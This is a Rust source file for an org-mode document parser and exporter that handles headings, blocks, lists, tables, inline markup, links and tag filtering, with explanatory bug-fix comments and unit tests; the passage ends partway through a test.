//! Org export infrastructure — parse org documents and export to various formats.
//!
//! @stability: experimental
//! @since: 0.9.0

pub mod html;
pub mod html_graph;
pub mod markdown;
pub mod markdown_parser;
pub mod org_writer;

// `html_graph` (the KB-subgraph -> bilingual interactive HTML export) is
// back in-tree here (previously extracted to the standalone
// `bilingual-kb-export` sibling project; see that project's
// `kb/adrs/0001-extract-into-standalone-project.org` for the original
// extraction rationale) so this feature ships as a normal, self-contained
// upstream module with no path-dependency on a sibling checkout.

/// Document-level metadata extracted from org keywords.
#[derive(Debug, Clone, Default)]
pub struct OrgMeta {
    pub title: Option<String>,
    pub author: Option<String>,
    pub date: Option<String>,
    pub language: Option<String>,
    pub options: ExportOptions,
    pub select_tags: Vec<String>,
    pub exclude_tags: Vec<String>,
}

/// Export options from `#+OPTIONS:` line.
#[derive(Debug, Clone)]
pub struct ExportOptions {
    pub toc: bool,
    pub toc_depth: u8,
    pub headline_levels: u8,
    pub num: bool,
    pub author_p: bool,
    pub date_p: bool,
}

impl Default for ExportOptions {
    fn default() -> Self {
        ExportOptions {
            toc: true,
            toc_depth: 3,
            headline_levels: 6,
            num: true,
            author_p: true,
            date_p: true,
        }
    }
}

/// Parsed org document elements.
#[derive(Debug, Clone)]
pub enum OrgElement {
    Heading {
        level: u8,
        title: String,
        tags: Vec<String>,
        todo: Option<String>,
        children: Vec<OrgElement>,
    },
    Paragraph(String),
    SrcBlock {
        language: String,
        body: String,
        exports: mae_babel::ExportsType,
    },
    ResultsBlock(String),
    List {
        ordered: bool,
        items: Vec<ListItem>,
    },
    Table {
        rows: Vec<Vec<String>>,
        has_header: bool,
    },
    Quote(String),
    /// `#+begin_example` ... `#+end_example` -- like `SrcBlock` but with no
    /// language/syntax highlighting and no inline-markup conversion of its
    /// contents, only escaping.
    Example(String),
    HorizontalRule,
    Comment(String),
    ExportBlock {
        format: String,
        content: String,
    },
}

/// A single list item with optional nesting.
#[derive(Debug, Clone)]
pub struct ListItem {
    pub content: String,
    pub children: Vec<ListItem>,
}

/// Trait for export backends.
pub trait Exporter {
    fn export(&self, meta: &OrgMeta, elements: &[OrgElement]) -> String;
}

/// Strip a leading ordered-list marker (`"1. "`, `"2) "`, ... including
/// multi-digit item numbers like `"10. "`) and return the remainder, or
/// `None` if `s` doesn't start with one. `str::strip_prefix` given a
/// `FnMut(char) -> bool` predicate only strips a single matching
/// character, not a run -- a naive `strip_prefix(|c| c.is_ascii_digit())`
/// strips just the `1` off `"10. Document..."`, leaving `"0. Document..."`,
/// which then fails the `". "`/`") "` check entirely. Any org list with 10+
/// items hit this: item 10 wasn't recognized as a list item at all and
/// fell through to plain-paragraph parsing instead, which (before the
/// paragraph-loop fix alongside this one) also had no properties-drawer
/// awareness -- a real, reproducible break in the onprem-iac KB's Phase 6
/// checklist (item 10 of 10).
fn strip_ordered_marker(s: &str) -> Option<&str> {
    let digit_len = s.chars().take_while(|c| c.is_ascii_digit()).count();
    if digit_len == 0 {
        return None;
    }
    let rest = &s[digit_len..];
    rest.strip_prefix(". ").or_else(|| rest.strip_prefix(") "))
}

/// Advance past a `:PROPERTIES:` ... `:END:` drawer starting at `lines[i]`
/// (caller has already confirmed `lines[i].trim()` is `:properties:`,
/// case-insensitive) and return the index of the first line after it.
/// Shared by the top-level element scanner and both list-item continuation
/// loops below -- a KB whose individual list items each carry their own
/// `:PROPERTIES: :ID: ... :END:` drawer (this project's convention for
/// giving stepwise roadmap/checklist items their own stable id, real and
/// reproducible in the onprem-iac KB) otherwise leaks the drawer verbatim
/// into a list item's rendered text: only the top-level scanner recognized
/// `:PROPERTIES:` as a drawer to skip, and it never got a chance to since
/// the list branches below consumed the same lines first as unconditional
/// "continuation text" before this function existed.
fn skip_properties_drawer(lines: &[&str], mut i: usize) -> usize {
    i += 1;
    while i < lines.len() {
        if lines[i].trim().eq_ignore_ascii_case(":end:") {
            return i + 1;
        }
        i += 1;
    }
    i
}

/// Parse an org-mode document into metadata and a flat list of elements.
pub fn parse_org_document(source: &str) -> (OrgMeta, Vec<OrgElement>) {
    let mut meta = OrgMeta::default();
    let mut elements = Vec::new();
    let lines: Vec<&str> = source.lines().collect();
    let mut i = 0;

    while i < lines.len() {
        let line = lines[i];
        let trimmed = line.trim();

        // Keywords
        if let Some(rest) = strip_keyword(trimmed, "#+title:") {
            meta.title = Some(rest.to_string());
            i += 1;
            continue;
        }
        if let Some(rest) = strip_keyword(trimmed, "#+author:") {
            meta.author = Some(rest.to_string());
            i += 1;
            continue;
        }
        if let Some(rest) = strip_keyword(trimmed, "#+date:") {
            meta.date = Some(rest.to_string());
            i += 1;
            continue;
        }
        if let Some(rest) = strip_keyword(trimmed, "#+language:") {
            meta.language = Some(rest.to_string());
            i += 1;
            continue;
        }
        if let Some(rest) = strip_keyword(trimmed, "#+options:") {
            parse_options_line(rest, &mut meta.options);
            i += 1;
            continue;
        }
        if let Some(rest) = strip_keyword(trimmed, "#+export_select_tags:") {
            meta.select_tags = rest.split_whitespace().map(|s| s.to_string()).collect();
            i += 1;
            continue;
        }
        if let Some(rest) = strip_keyword(trimmed, "#+export_exclude_tags:") {
            meta.exclude_tags = rest.split_whitespace().map(|s| s.to_string()).collect();
            i += 1;
            continue;
        }

        // Skip other keywords
        if trimmed.starts_with("#+") && !trimmed.to_ascii_lowercase().starts_with("#+begin") {
            i += 1;
            continue;
        }

        // PROPERTIES drawers (`:PROPERTIES:` ... `:END:`, e.g. `:ID:`,
        // `:KIND:`). Org property drawers are metadata, not renderable
        // content -- without this branch they fall through to the generic
        // paragraph collector below and leak into the rendered output
        // verbatim. Matched case-insensitively like the other keyword
        // checks above; org drawer markers are conventionally uppercase
        // but nothing in the spec requires it.
        if trimmed.eq_ignore_ascii_case(":properties:") {
            i = skip_properties_drawer(&lines, i);
            continue;
        }

        // Headings (any level). See `is_heading_line`'s doc comment for why
        // a naive `starts_with("**")` is wrong.
        if is_heading_line(trimmed) {
            let level = trimmed.chars().take_while(|&c| c == '*').count() as u8;
            let rest = trimmed[level as usize..].trim();
            let (title, tags) = parse_heading_tags(rest);
            let (todo, clean_title) = parse_heading_todo(&title);
            elements.push(OrgElement::Heading {
                level,
                title: clean_title,
                tags,
                todo,
                children: Vec::new(),
            });
            i += 1;
            continue;
        }

        // Source blocks
        let lower = trimmed.to_ascii_lowercase();
        if lower.starts_with("#+begin_src") {
            let header = &trimmed["#+begin_src".len()..].trim_start();
            let lang = header.split_whitespace().next().unwrap_or("").to_string();

            // Parse exports from header args
            let exports = if header.contains(":exports") {
                let blocks = mae_babel::parse_src_blocks(&lines[i..].join("\n"));
                blocks
                    .first()
                    .map(|b| b.header_args.exports.clone())
                    .unwrap_or(mae_babel::ExportsType::Code)
            } else {
                mae_babel::ExportsType::Code
            };

            let mut body_lines = Vec::new();
            i += 1;
            while i < lines.len() {
                if lines[i]
                    .trim()
                    .to_ascii_lowercase()
                    .starts_with("#+end_src")
                {
                    break;
                }
                body_lines.push(lines[i]);
                i += 1;
            }
            elements.push(OrgElement::SrcBlock {
                language: lang,
                body: body_lines.join("\n"),
                exports,
            });
            i += 1;
            continue;
        }

        // Results blocks
        if lower.starts_with("#+results:") || lower.starts_with("#+results[") {
            let mut result_lines = Vec::new();
            i += 1;
            while i < lines.len() {
                let rl = lines[i].trim();
                if rl.is_empty() || rl.starts_with("* ") || rl.starts_with("#+") {
                    break;
                }
                // Strip fixed-width prefix
                if let Some(content) = rl.strip_prefix(": ") {
                    result_lines.push(content.to_string());
                } else {
                    result_lines.push(rl.to_string());
                }
                i += 1;
            }
            elements.push(OrgElement::ResultsBlock(result_lines.join("\n")));
            continue;
        }

        // Quote blocks
        if lower.starts_with("#+begin_quote") {
            let mut quote_lines = Vec::new();
            i += 1;
            while i < lines.len() {
                if lines[i]
                    .trim()
                    .to_ascii_lowercase()
                    .starts_with("#+end_quote")
                {
                    break;
                }
                quote_lines.push(lines[i]);
                i += 1;
            }
            elements.push(OrgElement::Quote(quote_lines.join("\n")));
            i += 1;
            continue;
        }

        // Example blocks -- like a src block, but with no language/syntax
        // highlighting and (per org convention) no inline-markup conversion
        // of its contents, only HTML-escaping. Same shape as the quote-block
        // branch above.
        if lower.starts_with("#+begin_example") {
            let mut example_lines = Vec::new();
            i += 1;
            while i < lines.len() {
                if lines[i]
                    .trim()
                    .to_ascii_lowercase()
                    .starts_with("#+end_example")
                {
                    break;
                }
                example_lines.push(lines[i]);
                i += 1;
            }
            elements.push(OrgElement::Example(example_lines.join("\n")));
            i += 1;
            continue;
        }

        // Export blocks
        if lower.starts_with("#+begin_export") {
            let format = lower
                .strip_prefix("#+begin_export")
                .unwrap_or("")
                .trim()
                .to_string();
            let mut content_lines = Vec::new();
            i += 1;
            while i < lines.len() {
                if lines[i]
                    .trim()
                    .to_ascii_lowercase()
                    .starts_with("#+end_export")
                {
                    break;
                }
                content_lines.push(lines[i]);
                i += 1;
            }
            elements.push(OrgElement::ExportBlock {
                format,
                content: content_lines.join("\n"),
            });
            i += 1;
            continue;
        }

        // Horizontal rule
        if trimmed.starts_with("-----") {
            elements.push(OrgElement::HorizontalRule);
            i += 1;
            continue;
        }

        // Comments
        if trimmed.starts_with("# ") || trimmed == "#" {
            i += 1;
            continue;
        }

        // Tables
        if trimmed.starts_with('|') {
            let mut rows = Vec::new();
            let mut has_header = false;
            while i < lines.len() && lines[i].trim().starts_with('|') {
                let row_line = lines[i].trim();
                if row_line.starts_with("|-") {
                    has_header = true;
                } else {
                    let cells: Vec<String> = row_line
                        .trim_matches('|')
                        .split('|')
                        .map(|c| c.trim().to_string())
                        .collect();
                    rows.push(cells);
                }
                i += 1;
            }
            elements.push(OrgElement::Table { rows, has_header });
            continue;
        }

        // Lists
        if trimmed.starts_with("- ") || trimmed.starts_with("+ ") {
            let mut items = Vec::new();
            while i < lines.len() {
                let ll = lines[i].trim();
                if ll.starts_with("- ") || ll.starts_with("+ ") {
                    items.push(ListItem {
                        content: ll[2..].to_string(),
                        children: Vec::new(),
                    });
                    i += 1;
                } else if ll.is_empty() {
                    break;
                } else if ll.eq_ignore_ascii_case(":properties:") {
                    // A list item's own properties drawer (:ID:, etc.) --
                    // metadata, not continuation text; skip it rather than
                    // gluing it into the item's rendered content.
                    i = skip_properties_drawer(&lines, i);
                } else {
                    // Continuation line
                    if let Some(last) = items.last_mut() {
                        last.content.push(' ');
                        last.content.push_str(ll);
                    }
                    i += 1;
                }
            }
            elements.push(OrgElement::List {
                ordered: false,
                items,
            });
            continue;
        }

        // Ordered lists
        if trimmed.len() > 2 && trimmed.chars().next().is_some_and(|c| c.is_ascii_digit()) {
            if let Some(rest) = strip_ordered_marker(trimmed) {
                let mut items = vec![ListItem {
                    content: rest.to_string(),
                    children: Vec::new(),
                }];
                i += 1;
                while i < lines.len() {
                    let ll = lines[i].trim();
                    if let Some(item_rest) = strip_ordered_marker(ll) {
                        items.push(ListItem {
                            content: item_rest.to_string(),
                            children: Vec::new(),
                        });
                        i += 1;
                    } else if ll.is_empty() {
                        break;
                    } else if ll.eq_ignore_ascii_case(":properties:") {
                        // See the unordered-list branch above: a list
                        // item's own properties drawer is metadata, not
                        // continuation text.
                        i = skip_properties_drawer(&lines, i);
                    } else {
                        if let Some(last) = items.last_mut() {
                            last.content.push(' ');
                            last.content.push_str(ll);
                        }
                        i += 1;
                    }
                }
                elements.push(OrgElement::List {
                    ordered: true,
                    items,
                });
                continue;
            }
        }

        // Blank lines
        if trimmed.is_empty() {
            i += 1;
            continue;
        }

        // Paragraph: collect consecutive non-blank, non-special lines
        let mut para_lines = vec![line.to_string()];
        i += 1;
        while i < lines.len() {
            let pl = lines[i].trim();
            if pl.is_empty()
                || is_heading_line(pl)
                || pl.starts_with("#+")
                || pl.starts_with("| ")
                || pl.starts_with("- ")
                || pl.starts_with("+ ")
                || pl.starts_with("-----")
            {
                break;
            }
            if pl.eq_ignore_ascii_case(":properties:") {
                // A drawer embedded mid-paragraph (e.g. an org list item
                // whose own :ID: drawer fell through to plain-paragraph
                // parsing) is metadata, not prose -- skip it rather than
                // appending it verbatim. See skip_properties_drawer's doc
                // comment for the real KB pattern this handles.
                i = skip_properties_drawer(&lines, i);
                continue;
            }
            para_lines.push(lines[i].to_string());
            i += 1;
        }
        elements.push(OrgElement::Paragraph(para_lines.join("\n")));
    }

    (meta, elements)
}

/// A heading requires a space directly after the leading `*` run (or
/// nothing after it at all) -- without this check, markdown-style
/// `**bold text**` gets misparsed as a level-2 heading, since
/// `starts_with("**")` alone doesn't distinguish "** " from "**bold".
/// `trimmed` must already be `.trim()`-ed. Shared by both the heading
/// element detector and the paragraph-continuation break check, which had
/// the same latent bug independently (cuttlefisch/mae#528) since it
/// duplicated the naive check instead of sharing this one.
fn is_heading_line(trimmed: &str) -> bool {
    let leading_stars = trimmed.chars().take_while(|&c| c == '*').count();
    leading_stars > 0
        && (trimmed.len() == leading_stars || trimmed.as_bytes().get(leading_stars) == Some(&b' '))
}

fn strip_keyword<'a>(line: &'a str, keyword: &str) -> Option<&'a str> {
    let lower = line.to_ascii_lowercase();
    if lower.starts_with(keyword) {
        Some(line[keyword.len()..].trim())
    } else {
        None
    }
}

fn parse_options_line(options: &str, opts: &mut ExportOptions) {
    for part in options.split_whitespace() {
        if let Some((key, val)) = part.split_once(':') {
            match key {
                "toc" => {
                    if val == "nil" || val == "no" {
                        opts.toc = false;
                    } else if let Ok(n) = val.parse::<u8>() {
                        opts.toc = true;
                        opts.toc_depth = n;
                    }
                }
                "H" => {
                    if let Ok(n) = val.parse::<u8>() {
                        opts.headline_levels = n;
                    }
                }
                "num" => {
                    opts.num = val != "nil" && val != "no";
                }
                "author" => {
                    opts.author_p = val != "nil" && val != "no";
                }
                "date" => {
                    opts.date_p = val != "nil" && val != "no";
                }
                _ => {}
            }
        }
    }
}

fn parse_heading_tags(text: &str) -> (String, Vec<String>) {
    // Tags are at end: "Title  :tag1:tag2:"
    if let Some(tag_start) = text.rfind("  :") {
        let potential_tags = &text[tag_start + 2..];
        if potential_tags.ends_with(':') {
            let tags: Vec<String> = potential_tags
                .trim_matches(':')
                .split(':')
                .filter(|t| !t.is_empty())
                .map(|t| t.to_string())
                .collect();
            if !tags.is_empty() {
                return (text[..tag_start].trim().to_string(), tags);
            }
        }
    }
    (text.to_string(), Vec::new())
}

fn parse_heading_todo(title: &str) -> (Option<String>, String) {
    let todo_keywords = ["TODO", "DONE", "NEXT", "WAIT", "CANCELLED", "SOMEDAY"];
    for kw in &todo_keywords {
        if let Some(rest) = title.strip_prefix(kw) {
            if rest.starts_with(' ') || rest.is_empty() {
                return (Some(kw.to_string()), rest.trim().to_string());
            }
        }
    }
    (None, title.to_string())
}

#[derive(Debug, Clone, Copy)]
pub enum InlineTarget {
    Html,
    Markdown,
    /// Bare text, no markup at all — emphasis markers vanish (not `<b>`/
    /// `**`, just the inner text) and links resolve to their label alone
    /// (or the bare target, `id:`-stripped, if unlabeled) with no
    /// brackets/href. Added specifically so `plain_text_preview` (used for
    /// hover-popover previews) can reuse this one parser instead of a
    /// second, separate link-stripping implementation — see that
    /// function's doc comment.
    PlainText,
}

/// Convert org inline markup using string slicing (not char-based).
pub fn convert_inline_markup_str(text: &str, target: InlineTarget) -> String {
    let mut result = String::with_capacity(text.len());
    let bytes = text.as_bytes();
    let mut i = 0;

    while i < bytes.len() {
        let ch = bytes[i] as char;
        match ch {
            '*' | '/' | '~' | '=' | '+' if is_markup_start(text, i) => {
                if let Some((end, content)) = find_markup_end_str(text, i, ch) {
                    let converted = match (ch, target) {
                        ('*', InlineTarget::Html) => {
                            format!("<b>{}</b>", convert_inline_markup_str(content, target))
                        }
                        ('*', InlineTarget::Markdown) => {
                            format!("**{}**", convert_inline_markup_str(content, target))
                        }
                        ('*' | '/', InlineTarget::PlainText) => {
                            convert_inline_markup_str(content, target)
                        }
                        ('/', InlineTarget::Html) => {
                            format!("<i>{}</i>", convert_inline_markup_str(content, target))
                        }
                        ('/', InlineTarget::Markdown) => {
                            format!("*{}*", convert_inline_markup_str(content, target))
                        }
                        ('~' | '=', InlineTarget::Html) => {
                            format!("<code>{}</code>", html_escape(content))
                        }
                        ('~' | '=', InlineTarget::Markdown) => format!("`{}`", content),
                        ('~' | '=' | '+', InlineTarget::PlainText) => content.to_string(),
                        ('+', InlineTarget::Html) => format!("<del>{}</del>", html_escape(content)),
                        ('+', InlineTarget::Markdown) => format!("~~{}~~", content),
                        _ => content.to_string(),
                    };
                    result.push_str(&converted);
                    i = end + 1;
                    continue;
                }
            }
            'h' if is_bare_url_start(text, i) => {
                let end = find_bare_url_end(text, i);
                let url = &text[i..end];
                match target {
                    InlineTarget::Html => {
                        result.push_str(&format!(
                            "<a href=\"{}\">{}</a>",
                            html_escape(url),
                            html_escape(url)
                        ));
                    }
                    InlineTarget::Markdown => {
                        result.push_str(&format!("<{}>", url));
                    }
                    // No brackets, no href -- just the bare URL text, same
                    // "no markup at all" contract as the org-link PlainText
                    // arm below (this is the same hover-popover-preview use
                    // case: a bare URL should read as plain text there too,
                    // not `<...>`-wrapped Markdown-style markup).
                    InlineTarget::PlainText => {
                        result.push_str(url);
                    }
                }
                i = end;
                continue;
            }
            '[' if text[i..].starts_with("[[") => {
                if let Some((end, link_target, label)) = parse_org_link_str(text, i) {
                    // `id:` prefix survives on raw-org-file input but is
                    // already stripped on `mae_kb`-normalized input (see
                    // `parse_org_link_str`'s doc comment) -- strip
                    // defensively either way so it's never shown/used
                    // inconsistently. A stripped/bare (non-URL) target is
                    // an internal KB reference: give it a `#`-prefixed
                    // href (a real, if currently unhandled, in-page
                    // anchor form) rather than an invalid bare-UUID href.
                    let stripped_target = link_target.strip_prefix("id:").unwrap_or(link_target);
                    let is_external = stripped_target.contains("://");
                    let href = if is_external {
                        stripped_target.to_string()
                    } else {
                        format!("#{stripped_target}")
                    };
                    match target {
                        InlineTarget::Html => {
                            // `Some(l)` is already HTML-escaped by the
                            // recursive call (it walks the same char-by-
                            // char escaping this whole function does);
                            // the `None` (bare-target-as-label) case
                            // isn't escaped yet, so it still needs it
                            // here -- escaping `display` unconditionally
                            // would double-escape the `Some` case.
                            let display_html = match &label {
                                Some(l) => convert_inline_markup_str(l, target),
                                None => html_escape(stripped_target),
                            };
                            result.push_str(&format!(
                                "<a href=\"{}\">{}</a>",
                                html_escape(&href),
                                display_html
                            ));
                        }
                        InlineTarget::Markdown => {
                            let display = match &label {
                                Some(l) => convert_inline_markup_str(l, target),
                                None => stripped_target.to_string(),
                            };
                            result.push_str(&format!("[{display}]({href})"));
                        }
                        InlineTarget::PlainText => {
                            // No brackets, no href -- just the label (or
                            // the bare, id:-stripped target if unlabeled).
                            // This is the fix for hover-popover previews
                            // that used to show raw "[[UUID|label]]" text.
                            let display = match &label {
                                Some(l) => convert_inline_markup_str(l, target),
                                None => stripped_target.to_string(),
                            };
                            result.push_str(&display);
                        }
                    }
                    i = end + 1;
                    continue;
                }
            }
            _ => {}
        }
        // `ch` above (`bytes[i] as char`) is only valid for dispatching on
        // the ASCII markup-trigger bytes matched in the arms above -- every
        // one of `*`/`/`/`~`/`=`/`+`/`[` is a single UTF-8 byte, and no
        // ASCII byte value ever collides with a UTF-8 continuation
        // (0x80-0xBF) or leading (0xC0-0xF4) byte, so that dispatch is
        // byte-position-safe even with multibyte content nearby. But
        // falling through to here and still using `ch`/`i += 1` for the
        // general case was a real bug: any non-ASCII character (an
        // em-dash, any accented character -- i.e. this function silently
        // mangled every Spanish translation) got decoded one raw byte at
        // a time instead of one Unicode scalar at a time, corrupting it
        // into 2-4 garbage Latin-1-ish characters. Decode the real char
        // here instead.
        let real_ch = text[i..]
            .chars()
            .next()
            .expect("i is always a valid char boundary at this point");
        match (real_ch, target) {
            ('<', InlineTarget::Html) => result.push_str("&lt;"),
            ('>', InlineTarget::Html) => result.push_str("&gt;"),
            ('&', InlineTarget::Html) => result.push_str("&amp;"),
            ('"', InlineTarget::Html) => result.push_str("&quot;"),
            _ => result.push(real_ch),
        }
        i += real_ch.len_utf8();
    }

    result
}

fn is_markup_start(text: &str, pos: usize) -> bool {
    if pos == 0 {
        return true;
    }
    let prev = text.as_bytes()[pos - 1] as char;
    prev.is_whitespace() || matches!(prev, '(' | '{' | '"' | '\'' | '[')
}

fn find_markup_end_str(text: &str, start: usize, marker: char) -> Option<(usize, &str)> {
    let marker_byte = marker as u8;
    let bytes = text.as_bytes();
    // Search for closing marker after start+1
    for end in (start + 2)..bytes.len() {
        if bytes[end] == marker_byte {
            // Closing marker must be followed by whitespace, punctuation, or end
            let after_ok = end + 1 >= bytes.len() || {
                let next = bytes[end + 1] as char;
                next.is_whitespace()
                    || matches!(
                        next,
                        ')' | '}' | '"' | '\'' | '.' | ',' | ';' | ':' | '!' | '?' | ']'
                    )
            };
            // Content must not start/end with whitespace
            let content_ok =
                !bytes[start + 1].is_ascii_whitespace() && !bytes[end - 1].is_ascii_whitespace();
            if after_ok && content_ok {
                return Some((end, &text[start + 1..end]));
            }
        }
    }
    None
}

/// True if `text[pos..]` begins a bare (unbracketed) `http://`/`https://`
/// URL that should be autolinked. Unlike the emphasis markers, a URL scheme
/// is an unambiguous enough signal on its own -- no preceding-whitespace
/// requirement, so `(see https://example.com)` still autolinks even though
/// the scheme starts right after `(`.
fn is_bare_url_start(text: &str, pos: usize) -> bool {
    let rest = &text[pos..];
    rest.starts_with("http://") || rest.starts_with("https://")
}

/// Find the end (exclusive byte offset) of a bare URL starting at `start`.
/// Runs until whitespace, or a trailing punctuation mark that's more likely
/// to be sentence punctuation than part of the URL (mirrors common
/// autolink conventions, e.g. GFM's).
fn find_bare_url_end(text: &str, start: usize) -> usize {
    let bytes = text.as_bytes();
    let mut end = start;
    while end < bytes.len() && !bytes[end].is_ascii_whitespace() {
        end += 1;
    }
    while end > start
        && matches!(
            bytes[end - 1],
            b'.' | b',' | b')' | b']' | b'!' | b'?' | b':' | b';'
        )
    {
        end -= 1;
    }
    end
}

fn parse_org_link_str(text: &str, start: usize) -> Option<(usize, &str, Option<&str>)> {
    // [[target][label]] (raw org-file two-bracket-group form) or [[target]]
    // (bare) -- AND `[[target|label]]` (single bracket-group, pipe-
    // separated), which is NOT standard org-file syntax but IS the literal
    // storage form `mae_kb`'s own org parser canonicalizes every internal
    // `[[id:UUID][label]]` link into (see `shared/kb/src/org.rs`'s link
    // normalization, "the internal pipe-display convention"). Both this
    // module's exporters (`html.rs`'s `HtmlExporter`, `html_graph.rs`'s
    // graph export) render `mae_kb::Node::body` -- i.e. the ALREADY-
    // normalized pipe form, not raw org-file text -- so without this,
    // every internal link renders as a garbled, unsplit "UUID|label"
    // string used as both href and visible text. Recognizing `|` here is
    // safe/non-regressive for genuine raw-org-file callers: standard
    // Org-mode link syntax never legitimately puts a bare `|` inside a
    // single `[[...]]` bracket pair.
    if !text[start..].starts_with("[[") {
        return None;
    }
    let after_open = start + 2;
    // Find ][  or ]]
    let rest = &text[after_open..];
    if let Some(bracket_pos) = rest.find("][") {
        let target = &text[after_open..after_open + bracket_pos];
        let label_start = after_open + bracket_pos + 2;
        if let Some(close_pos) = text[label_start..].find("]]") {
            let label = &text[label_start..label_start + close_pos];
            return Some((label_start + close_pos + 1, target, Some(label)));
        }
    }
    if let Some(close_pos) = rest.find("]]") {
        let inner = &text[after_open..after_open + close_pos];
        let end = after_open + close_pos + 1;
        if let Some(bar) = inner.find('|') {
            return Some((end, &inner[..bar], Some(&inner[bar + 1..])));
        }
        return Some((end, inner, None));
    }
    None
}

/// State of a parsed org checkbox marker (`[ ]`/`[X]`/`[-]`).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CheckboxState {
    Unchecked,
    Checked,
    /// `[-]` -- a parent checklist item with some but not all children
    /// checked. Org itself derives this automatically; we only need to
    /// render whatever marker is already in the source.
    Partial,
}

/// Parse a leading org checkbox marker from a list item's content, if
/// present. `- [ ] Buy milk`'s `ListItem::content` (bullet already
/// stripped by the list parser) is `"[ ] Buy milk"` -- returns the marker
/// state and the remaining text with the marker and its trailing
/// whitespace removed.
pub fn parse_checkbox_marker(content: &str) -> Option<(CheckboxState, &str)> {
    let state = match content.get(0..3)? {
        "[ ]" => CheckboxState::Unchecked,
        "[X]" | "[x]" => CheckboxState::Checked,
        "[-]" => CheckboxState::Partial,
        _ => return None,
    };
    Some((state, content[3..].trim_start()))
}

pub fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
}

/// Filter elements by export tags.
pub fn filter_by_tags(
    elements: &[OrgElement],
    select_tags: &[String],
    exclude_tags: &[String],
) -> Vec<OrgElement> {
    elements
        .iter()
        .filter(|el| {
            if let OrgElement::Heading { tags, .. } = el {
                // If exclude tags match, skip
                if exclude_tags.iter().any(|t| tags.contains(t)) {
                    return false;
                }
                // If select tags are specified, only include matching headings
                if !select_tags.is_empty() && !select_tags.iter().any(|t| tags.contains(t)) {
                    return false;
                }
            }
            true
        })
        .cloned()
        .collect()
}

/// Extract a subtree starting at a given heading level and line index.
pub fn extract_subtree(elements: &[OrgElement], heading_idx: usize) -> Vec<OrgElement> {
    if heading_idx >= elements.len() {
        return Vec::new();
    }

    let start_level = match &elements[heading_idx] {
        OrgElement::Heading { level, .. } => *level,
        _ => return vec![elements[heading_idx].clone()],
    };

    let mut result = vec![elements[heading_idx].clone()];
    for el in &elements[heading_idx + 1..] {
        if let OrgElement::Heading { level, .. } = el {
            if *level <= start_level {
                break;
            }
        }
        result.push(el.clone());
    }
    result
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_meta_title() {
        let src = "#+title: My Document\n#+author: Test\n#+date: 2026-01-01\n\nContent\n";
        let (meta, _) = parse_org_document(src);
        assert_eq!(meta.title.as_deref(), Some("My Document"));
        assert_eq!(meta.author.as_deref(), Some("Test"));
        assert_eq!(meta.date.as_deref(), Some("2026-01-01"));
    }

    #[test]
    fn parse_headings() {
        let src = "* Heading 1\n** Heading 2\n*** Heading 3\n";
        let (_, elements) = parse_org_document(src);
        assert_eq!(elements.len(), 3);
        if let OrgElement::Heading { level, title, .. } = &elements[0] {
            assert_eq!(*level, 1);
            assert_eq!(title, "Heading 1");
        }
    }

    #[test]
    fn markdown_style_bold_without_a_space_is_not_misparsed_as_a_heading() {
        // Real bug traced from mae's own manual (concept-modules.org): a
        // paragraph starting with markdown-style "**bold**" (not valid org
        // syntax -- org bold is "*bold*" -- but real content that exists)
        // was silently swallowed whole into a level-2 heading, because the
        // "Multi-level headings" branch of heading detection only checked
        // `starts_with("**")`, with no check that a space (or nothing)
        // follows the stars the way the level-1 branch correctly required.
        // See cuttlefisch/mae#528.
        let src = "**Key invariant:** Module autoloads run BEFORE config.\n";
        let (_, elements) = parse_org_document(src);
        assert_eq!(elements.len(), 1);
        assert!(
            matches!(&elements[0], OrgElement::Paragraph(p) if p.starts_with("**Key invariant:**")),
            "expected a real paragraph, not a heading: {:?}",
            elements[0]
        );
    }

    #[test]
    fn a_real_heading_with_no_text_after_the_stars_still_parses() {
        // Guards the OTHER edge of the same fix: a bare "**" (stars are
        // the entire trimmed line, nothing after them at all) must still
        // parse as a real, empty-title heading -- the fix must not
        // require a trailing space when there's nothing to have space
        // before, only when there's real content directly after the
        // stars with no separating space.
        let src = "**\n";
        let (_, elements) = parse_org_document(src);
        assert_eq!(elements.len(), 1);
        if let OrgElement::Heading { level, title, .. } = &elements[0] {
            assert_eq!(*level, 2);
            assert_eq!(title, "");
        } else {
            panic!("expected a heading: {:?}", elements[0]);
        }
    }

    #[test]
    fn parse_heading_with_tags() {
        let src = "* My Heading  :tag1:tag2:\n";
        let (_, elements) = parse_org_document(src);
        if let OrgElement::Heading { title, tags, .. } = &elements[0] {
            assert_eq!(title, "My Heading");
            assert_eq!(tags, &["tag1".to_string(), "tag2".to_string()]);
        }
    }

    #[test]
    fn parse_heading_with_todo() {
        let src = "* TODO My Task\n";
        let (_, elements) = parse_org_document(src);
        if let OrgElement::Heading { todo, title, .. } = &elements[0] {
            assert_eq!(todo.as_deref(), Some("TODO"));
            assert_eq!(title, "My Task");
        }
    }

    #[test]
    fn parse_src_block() {
        let src = "#+begin_src python\nprint(1)\n#+end_src\n";
        let (_, elements) = parse_org_document(src);
        assert_eq!(elements.len(), 1);
        if let OrgElement::SrcBlock { language, body, .. } = &elements[0] {
            assert_eq!(language, "python");
            assert_eq!(body, "print(1)");
        }
    }

    #[test]
    fn parse_table() {
        let src = "| a | b |\n|---+---|\n| 1 | 2 |\n";
        let (_, elements) = parse_org_document(src);
        assert_eq!(elements.len(), 1);
        if let OrgElement::Table { rows, has_header } = &elements[0] {
            assert_eq!(rows.len(), 2);
            assert!(*has_header);
        }
    }

    #[test]
    fn parse_list() {
        let src = "- item 1\n- item 2\n- item 3\n";
        let (_, elements) = parse_org_document(src);
        assert_eq!(elements.len(), 1);
        if let OrgElement::List { ordered, items } = &elements[0] {
            assert!(!ordered);
            assert_eq!(items.len(), 3);
        }
    }

    #[test]
    fn ordered_list_item_with_its_own_properties_drawer_does_not_leak_it() {
        // Real, reproducible leak from the onprem-iac KB: this project gives
        // individual roadmap/checklist steps their own stable :ID:, so each
        // numbered item can carry its own :PROPERTIES: drawer, not just the
        // document as a whole. The top-level scanner already stripped a
        // drawer that starts a document/paragraph, but once the parser
        // enters the ordered-list continuation-line loop it used to glue
        // every non-blank line (including a nested drawer's :PROPERTIES:/
        // :ID:/:END: lines) into the item's own rendered content verbatim.
        let src = "1. Document a runbook covering rollback steps if the\n   upgrade fails partway.\n   :PROPERTIES:\n   :ID: db87b07f-2f87-4f0d-b1dc-4f398313bf73\n   :END:\n   Validated by: cross-checked against the runbook.\n2. Establish an on-call rotation.\n";
